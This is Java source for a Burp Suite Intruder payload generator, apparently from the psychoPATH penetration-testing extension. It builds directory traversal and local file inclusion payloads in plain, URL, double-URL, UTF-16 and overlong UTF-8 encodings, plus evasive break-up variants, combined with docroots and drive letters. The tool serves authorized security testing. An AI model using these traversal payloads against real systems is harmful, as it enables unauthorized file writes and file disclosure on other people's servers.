package uk.co.pentest.psychoPATH;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IIntruderPayloadGenerator;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.ListModel;

/*
 * @author ewilded
 */
public final class IntruderPayloadGenerator implements IIntruderPayloadGenerator 
{

    ArrayList<String> psychopaths; // the final payloads
    ArrayList<String> psychopaths_raw; // payloads before output encoding
    //static int pathInstances=0;
    int payloadIndex;    // counter for the payload mark       
    String payloadType;  // path or mark
    byte[] bytes_raw;    // byte payloads    
    ArrayList<String> bytes_out; // 
    IBurpExtenderCallbacks callbacks = BurpExtender.getBurpCallbacks();
    ArrayList<String> directoriesToCheck; // this is for the verification phase
    int payloadMarkerLength=7; // the lenght of the payload marker, a fixed length is safer while injecting into images etc.   
    PsychoTab tab;
    
    //protected String[] spaces={" ","%20","%25%32%65","%u0020","",""};   
    // plain, URL-encoded, double-URL-encoded, UTF-16, overlong UTF 2-byte, overlong UTF 3-byte // ,overlong UTF 4-byte, overlong UTF 5-byte, overlong UTF 6-byte
    // must have the same number of elements, otherwise the non-mixed encoding basic variant will get confused
    String[] dots={".", "%2e", "%25%32%65","%u002e", "%c0%ae", "%e0%ae"}; // %f0%80%80%ae, %f8%80%80%80%ae, %fc%80%80%80%80%ae
    String[] slashes={"/","%2f","%25%32%66","%u2215","%c0%af", "%e0%af"}; // %f0%80%80%af, %f8%80%80%80%af, %fc%80%80%80%80%af
    String[] backslashes={"\\","%5c","%25%35%63","%u2216","%c1%9c","%e1%9c"}; // %f1%80%80%9c, %f9%80%80%80%9c, %fd%80%80%80%80%9c
    //. = %u002e, / = %u2215, \ = %u2216 
    ArrayList<String> unitTraversalsToUse;
    ArrayList<String> basicTraversals;
                                   
    ArrayList<String> slashesToUse;
    
    protected void addWindows()
    {
        for(int i=0;i<this.backslashes.length;i++)
        {
            slashesToUse.add(backslashes[i]);
        }
        basicTraversals.add("..\\");
    }
    
    protected void addUnix()
    {
        for(int i=0;i<this.slashes.length;i++)
        {
            slashesToUse.add(slashes[i]);
        }
        basicTraversals.add("../");        
    }

    public IntruderPayloadGenerator(String payloadType, PsychoTab tab) 
    {
        this.payloadType = payloadType;
        this.tab=tab;
        
        unitTraversalsToUse = new ArrayList<>();
        slashesToUse = new ArrayList<>();
        basicTraversals = new ArrayList<>();
        
        if("path".equals(this.payloadType)||"mark".equals(this.payloadType)) // "path" and "marker" generators
        {
            Set<String> targetDocroots; // this is a merge of the prefixes and targets
            ArrayList<String> brutDocrootSuffixes; // we'll also merge all targets into this
            ArrayList<String> traversals;
      
            
            if(this.tab.psychoPanel.slashesToUse=="win")
            {
                addWindows();
            }
            if(this.tab.psychoPanel.slashesToUse=="nix")
            {
                addUnix();
            }
            if(this.tab.psychoPanel.slashesToUse=="all")
            {
                addWindows();
                addUnix();
            }
            
            for(int i=0;i<this.basicTraversals.size();i++)
            {
                unitTraversalsToUse.add(basicTraversals.get(i));                
            }
            
            // fix the init             [DONE]
            
            // now, add basic (non-mixed) support for different encodings ;]]   [DONE]            
            
            for(int i=0;i<basicTraversals.size();i++)
            {
                String payload = basicTraversals.get(i);
                for(int j=1;j<dots.length;j++) // skip the first element as it is equal to what we're replacing
                {
                    payload=payload.replace(".",dots[j]);
                    payload=payload.replace("/",slashes[j]);
                    payload=payload.replace("\\",backslashes[j]);
                    unitTraversalsToUse.add(payload);
                }
            }            
            
            // OK, not so bad - now we need to fix the accidental mixing of the slashes appended att the slashesToUse() substitution phase
             
            // and then create the proper  mixed encoding variants and we are almost done
            // add scanner integration ffs
            // then add termination character in different encodings + reflect these changes in the UI
            // reflect these changes in the documentation
            // find vulns and send this to the store ;]
                               
        // mixed-encoding variants
        /*
        this.basicTraversals.add(".%2e/");
        this.basicTraversals.add(".%2e%2f");
        this.basicTraversals.add(".%2e%2f");
        this.basicTraversals.add("..%2f/.");
        
        // UTF-8
        this.basicTraversals.add("%c0%2e%c0%af%c0%af"); 
        // UTF-16
        this.basicTraversals.add("%u002e%u2215%u2215");
        // 2-byte overlong UTF-8
        this.basicTraversals.add("%c0%ae%c0%af%c0%af");
        */
            // load the evasive traversals, according to the set of slashes to use
            if(this.tab.psychoPanel.evasiveTechniques)
            {
                // read and decode the list of currently loaded breakup strings, if there are any
                ListModel breakupModel = this.tab.psychoPanel.breakupList.getModel();
                ArrayList<String> breakupStrings = new ArrayList<>();
                for(int i=0;i<breakupModel.getSize();i++)
                {
                    String asciihex=breakupModel.getElementAt(i).toString();
                    // ok, now we need to convert it back to characters and store in the breakupTraversals array
                    StringBuilder output = new StringBuilder();
                    for (int j = 0; j < asciihex.length(); j+=2) 
                    {
                        String str = asciihex.substring(j,j+2);
                        output.append((char)Integer.parseInt(str,16));
                    }
                    breakupStrings.add(output.toString());
                }
                
                ListModel evasiveTravModel = this.tab.psychoPanel.evasiveList.getModel();
                for (int i=0; i<evasiveTravModel.getSize(); i++) 
                {
                    String evasiveTraversal=evasiveTravModel.getElementAt(i).toString();
                    if(evasiveTraversal.contains("{BREAK}")) // we are dealing with a break-up sequence
                    {
                        // iterate over break-up strings and create variations
                        for(int j=0;j<breakupStrings.size();j++)
                        {
                            unitTraversalsToUse.add(evasiveTraversal.replace("{BREAK}", breakupStrings.get(j)));
                        }
                        // otherwise the traversal is ignored (not added to the unitTraversalsToUse arr list)
                    }
                    else
                    {
                        unitTraversalsToUse.add(evasiveTraversal);
                    }
                }  
 
            }
            String fileName;
            PsychoPanel panel=this.tab.getUiComponent();                        
            this.psychopaths = new ArrayList<>();
            this.psychopaths_raw = new ArrayList<>();           
            // generate all the payloads and put them into the arr
            targetDocroots = new HashSet<>();
            brutDocrootSuffixes = new ArrayList<>();
            traversals = new ArrayList<>(); 
            // 0) populate traversals and the filename           
            ArrayList<String> longestTraversals = new ArrayList<>();
            for(int i=0;i<unitTraversalsToUse.size();i++)
            {
                String baseTraversal = unitTraversalsToUse.get(i);
                String traversal=baseTraversal;
                for(int j=0;j<this.tab.psychoPanel.maxTraversalsPerPayload;j++)
                {
                    traversals.add(traversal);
                    if(j==this.tab.psychoPanel.maxTraversalsPerPayload-1) longestTraversals.add(traversal);
                    traversal=traversal+baseTraversal;
                }
            }
                    
            fileName=panel.fileNameField.getText();
      
            // 1) copy @brute_doc_root_prefixes to @target_docroots
            if(panel.LFImode==false) // whether to use the webroots at all
            {
                ListModel docListModel = panel.docrootsList.getModel();
            //if(docListModel==null) this.panel.stdout.println("The thing is empty...");
            
                for (int i=0; i<docListModel.getSize(); i++) 
                {
                    String targetDocroot=docListModel.getElementAt(i).toString();
                    // if the targetDocroot contains the {TARGET} holder
               
                    if(targetDocroot.contains("{TARGET}"))
                    {
                        // iterate over the targets 
                        // and create corresponding versions of the targetDocroot by substitution
                        ListModel targetListModel = panel.targetsList.getModel();
                   
                        for(int j=0;j<targetListModel.getSize();j++)
                        {
                             String target=targetListModel.getElementAt(j).toString();
                             String newTargetDocroot=targetDocroot.replace("{TARGET}",target);
                             targetDocroots.add(newTargetDocroot);
                        } 
                                        
                    }
                     // otherwise simply copy the targetDocroot                
                     else
                    {
                     targetDocroots.add(targetDocroot);     
                    }                
                }             
                // add the empty suffix
                brutDocrootSuffixes.add("");
                // 2.1) copy @targets to @brut_doc_suffixes
                ListModel targetListModel = panel.targetsList.getModel();
                for(int i=0;i<targetListModel.getSize();i++)
                {
                   String target=targetListModel.getElementAt(i).toString();
                   brutDocrootSuffixes.add(target);
                }                 
                // 2.2) copy @suffixes to @brut_doc_suffixes
                ListModel suffixListModel = panel.suffixesList.getModel();
                for(int i=0;i<suffixListModel.getSize();i++)
                {
                    String suffix=suffixListModel.getElementAt(i).toString();
                    brutDocrootSuffixes.add(suffix);
                }
                // 3.1) iterate through @targetDocroots -> 
                //        3.2)   iterate through @brute_doc_root_suffixes -> 
            //                3.3)      iterate through traversals -> 
            //                     3.4)              generate psychopaths
            }
            // 3.4.1 the bare filename with no prepended path injections
            this.psychopaths_raw.add(fileName);             
            // 3.4.2 the pure traversal + filename permutations (for upload directories hidden within the document root and LFI mode)
            if(panel.LFImode==true&&panel.optimizeLFI==true)
            {
                for(int i=0;i<longestTraversals.size();i++)        // 3.3
                {
                    String payload=longestTraversals.get(i)+"/"+fileName;
                    for(int j=0;j<slashesToUse.size();j++)
                    {
                        this.psychopaths_raw.add(payload.replace("/",slashesToUse.get(j)));      
                    }                    
                }
            }
            else
            {
                for(int i=0;i<traversals.size();i++)
                {
                    String payload=traversals.get(i)+"/"+fileName;
                    for(int j=0;j<slashesToUse.size();j++)
                    {
                        this.psychopaths_raw.add(payload.replace("/",slashesToUse.get(j))); 
                    }
                }
            }

            // 3.4.3 the targetDocroot+brutDocrootsuffix permutations 
            for(String targetDocRoot : targetDocroots) // 3.1
            {
                for(int i=0;i<brutDocrootSuffixes.size();i++) // 3.2
                {     
                    if(this.tab.psychoPanel.optimizeDocroots)
                    {
                        for(int j=0;j<longestTraversals.size();j++)        // 3.3
                        {
                          // if the docroot is windows-specific, we skip the letter for the traversal for it to work
                          String payload=longestTraversals.get(j)+targetDocRoot.replace("C:","")+"/"+brutDocrootSuffixes.get(i)+"/"+fileName;
                          for(int k=0;k<slashesToUse.size();k++)
                          {
                                this.psychopaths_raw.add(payload.replace("/",slashesToUse.get(k)));   
                          }
                        }
                    }
                    else
                    {
                        for(int j=0;j<traversals.size();j++)        // 3.3
                        {
                          String payload=traversals.get(j)+targetDocRoot.replace("C:","")+"/"+brutDocrootSuffixes.get(i)+"/"+fileName;
                          for(int k=0;k<slashesToUse.size();k++)
                          {
                                this.psychopaths_raw.add(payload.replace("/",slashesToUse.get(k)));
                          }
                        }
                    }
                    if(this.tab.psychoPanel.useAbsoluteWebroots)
                    {
                         ListModel drivesModel = panel.drivesList.getModel();                                                                          
                         String payload=targetDocRoot+"/"+brutDocrootSuffixes.get(i)+"/"+fileName;
                         for(int j=0;j<slashesToUse.size();j++)
                         {
                                String docroot=payload.replace("/",slashesToUse.get(j));
                                if(docroot.startsWith("C:"))
                                {
                                    for(int k=0;k<drivesModel.getSize();k++)
                                    {
                                         // if we are dealing with windows, we nee to make sure we use all drive the letters configured                                    
                                         this.psychopaths_raw.add(docroot.replace("C:",drivesModel.getElementAt(k).toString()+":"));                                 
                                    }  
                                }
                                else
                                {
                                    this.psychopaths_raw.add(docroot);
                                }
                         }                       
                    }
                }
            }                
            // now we have to deal with the output encodings
            ListModel encodeModel = this.tab.psychoPanel.encodeList.getModel();
            for(int j=0;j<this.psychopaths_raw.size();j++)
            {
                for(int i=0;i<encodeModel.getSize();i++)
                {
                   if("None".equals(encodeModel.getElementAt(i).toString()))
                   {
                       this.psychopaths.add(this.psychopaths_raw.get(j));
                   }
                   if("URL".equals(encodeModel.getElementAt(i).toString())) // URL encode
                   {
                       try {                    
                           this.psychopaths.add(URLEncoder.encode(this.psychopaths_raw.get(j),StandardCharsets.UTF_8.toString()));
                       } catch (UnsupportedEncodingException ex) {
                           Logger.getLogger(IntruderPayloadGenerator.class.getName()).log(Level.SEVERE, null, ex);
                       }
                   }
                   if("Double URL".equals(encodeModel.getElementAt(i).toString()))
                   {
                        try {                       
                           this.psychopaths.add(URLEncoder.encode(URLEncoder.encode(this.psychopaths_raw.get(j),StandardCharsets.UTF_8.toString())));
                       } catch (UnsupportedEncodingException ex) {
                           Logger.getLogger(IntruderPayloadGenerator.class.getName()).log(Level.SEVERE, null, ex);
                       }
                   }
                }
            }
        }
        if("check".equals(payloadType)&&this.directoriesToCheck==null)
        {
            this.directoriesToCheck=new ArrayList<>();
            this.directoriesToCheck=tab.psychoPanel.genericSuffixes; // we simply steal this list :)
        }
    }
    @Override
    public boolean hasMorePayloads() 
    {
        if("check".equals(this.payloadType))
        {
            return this.payloadIndex<this.directoriesToCheck.size();
        }
        if("mark".equals(this.payloadType)||"path".equals(this.payloadType))
        {
            return this.payloadIndex < this.psychopaths.size();
        }
        return false; //unreachable statement
    }

    @Override
    public byte[] getNextPayload(byte[] baseValue) 
    {                
        byte[] payload  = new byte[0];
        if("mark".equals(this.payloadType))
        {
            // return the payload mark corresponding to the path payload, which is simply a unique string (number -> index)
            String prefix="";
            int ln = this.payloadMarkerLength-Integer.toString(this.payloadIndex).length();
            for(int i=0;i<ln;i++) prefix=prefix+"0";
            payload=callbacks.getHelpers().stringToBytes(prefix+Integer.toString(this.payloadIndex));
        }
        if("path".equals(this.payloadType))
        {
            // return the path payload
            payload = callbacks.getHelpers().stringToBytes(this.psychopaths.get(this.payloadIndex).toString());           
        }
        if("check".equals(this.payloadType))
        {
            payload = callbacks.getHelpers().stringToBytes(this.directoriesToCheck.get(this.payloadIndex).toString()); 
        }
        this.tab.psychoPanel.logOutput("Payload index "+this.payloadIndex+", payload type:"+this.payloadType);
        this.payloadIndex++; // increase the index
        return payload;
    }
    @Override
    public void reset() 
    {        
        payloadIndex = 0;
    }       
}